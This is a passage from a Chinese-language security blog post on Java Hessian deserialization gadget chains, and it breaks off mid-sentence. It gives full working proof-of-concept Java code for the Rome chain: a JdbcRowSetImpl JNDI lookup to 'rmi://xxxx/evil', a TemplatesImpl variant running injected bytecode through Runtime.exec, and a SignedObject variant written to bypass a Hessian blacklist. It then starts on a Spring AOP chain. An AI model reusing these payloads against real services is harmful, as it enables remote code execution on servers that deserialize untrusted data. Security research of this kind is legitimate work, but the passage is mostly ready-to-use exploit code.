class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object target, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> target.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(target,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">&quot;rmi://xxxx/evil&quot;</span>);</span><br><span class="line">        <span class="comment">// jdbcRowSet.getDatabaseMetaData();</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringbean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(jdbcRowSet.getClass(), jdbcRowSet);</span><br><span class="line">        <span class="comment">// toStringbean.toString();</span></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(toStringbean.getClass(), toStringbean);</span><br><span class="line">        <span class="comment">// equalsBean.hashCode();</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(equalsBean, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        setValue(toStringbean, <span class="string">&quot;obj&quot;</span>, jdbcRowSet);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化开始</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(os);</span><br><span class="line">        output.writeObject(map);   <span class="comment">//对象写在这</span></span><br><span class="line">        output.close();</span><br><span class="line">        <span class="comment">//反序列化开始</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(os.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bis);</span><br><span class="line">        input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了避免在 <code>map.put(equalsBean, &quot;bbb&quot;);</code> 就触发 <code>JNDI</code> ，我们这里可以通过反射来添加元素到 <code>map</code> 中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">size.set(map, <span class="number">1</span>);</span><br><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, aClass);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Array.newInstance(aClass, <span class="number">1</span>);</span><br><span class="line">Array.set(o, <span class="number">0</span>, constructor.newInstance(<span class="number">0</span>, equalsBean, <span class="string">&quot;a&quot;</span>, <span class="literal">null</span>));</span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">table.set(map, o);</span><br></pre></td></tr></table></figure><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>但是上面的 <code>poc</code> 需要出网，所以通常被认为限制很高。所以还可以用 <code>TemplatesImpl.getOutputProperties()</code> 来直接触发 <code>RCE</code> 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;RANDOM&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> getTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringbean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(toStringbean.getClass(), toStringbean);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(map, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, aClass);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Array.newInstance(aClass, <span class="number">1</span>);</span><br><span class="line">        Array.set(o, <span class="number">0</span>, constructor.newInstance(<span class="number">0</span>, equalsBean, <span class="string">&quot;a&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        table.set(map, o);</span><br><span class="line"></span><br><span class="line">        setValue(toStringbean, <span class="string">&quot;obj&quot;</span>, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化开始</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(os);</span><br><span class="line">        output.writeObject(map);   <span class="comment">//对象写在这</span></span><br><span class="line">        output.close();</span><br><span class="line">        <span class="comment">//反序列化开始</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(os.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bis);</span><br><span class="line">        input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用SignObject二次反序列化来RCE改进poc"><a href="#利用SignObject二次反序列化来RCE改进poc" class="headerlink" title="利用SignObject二次反序列化来RCE改进poc"></a>利用SignObject二次反序列化来RCE改进poc</h3><p>防止 <code>Hessian</code> 在反序列化的时候把常用的 <code>TemplatesImpl</code> 放入了黑名单，这里可以通过 <code>SignObject#getObject()</code> 来二次反序列化绕过。这里正好 <code>getObject()</code> 就是一个 <code>getter</code> 方法。</p><blockquote><p>不过需要目标存在 <code>jdk</code> 原生反序列化漏洞，而正好 <code>rome</code> 组件本身就有反序列化漏洞。参考 <a href="Java%E5%AE%89%E5%85%A8/Rome%E9%93%BE.md">Rome链</a> 。</p></blockquote><p><code>poc</code> 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span></span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;RANDOM&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getRomeExp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> getTemplatesImpl();</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;justdoit&quot;</span>);</span><br><span class="line">        setValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, toStringBean);</span><br><span class="line">        <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>((Serializable) getRomeExp(),  kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringbean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(signedObject.getClass(), signedObject);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(toStringbean.getClass(), toStringbean);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(map, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, aClass);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Array.newInstance(aClass, <span class="number">1</span>);</span><br><span class="line">        Array.set(o, <span class="number">0</span>, constructor.newInstance(<span class="number">0</span>, equalsBean, <span class="string">&quot;a&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        table.set(map, o);</span><br><span class="line"></span><br><span class="line">        setValue(toStringbean, <span class="string">&quot;obj&quot;</span>, signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化开始</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(os);</span><br><span class="line">        output.writeObject(map);   <span class="comment">//对象写在这</span></span><br><span class="line">        output.close();</span><br><span class="line">        <span class="comment">//反序列化开始</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(os.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bis);</span><br><span class="line">        input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Spring-AOP链"><a href="#Spring-AOP链" class="headerlink" title="Spring AOP链"></a>Spring AOP链</h1><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.3.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>Spring AOP</code> 组件中的 <code>AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder#toString()</code> 方法可以触发 <code>SimpleJndiBeanFactory#doGetSingleton()</code> 中的 <code>JNDI</code> 注入。虽然这个链子中的类没有实现 <code>Serializable</code> 接口，但是 <code>Hessian</code> 提供了机制可以反序列化非 <code>Serializable</code> 接口的类，从而 <code>Hessian</code> 反序列化可以用这个链子。</p><p><img src="/imgs/Pasted%20image%2020240312234306.png"></p><p>此外，上面的链子还有另一个起点： <code>AbstractPointcutAdvisor#equals()</code> 方法触发  <code>SimpleJndiBeanFactory#doGetSingleton()</code> 中的 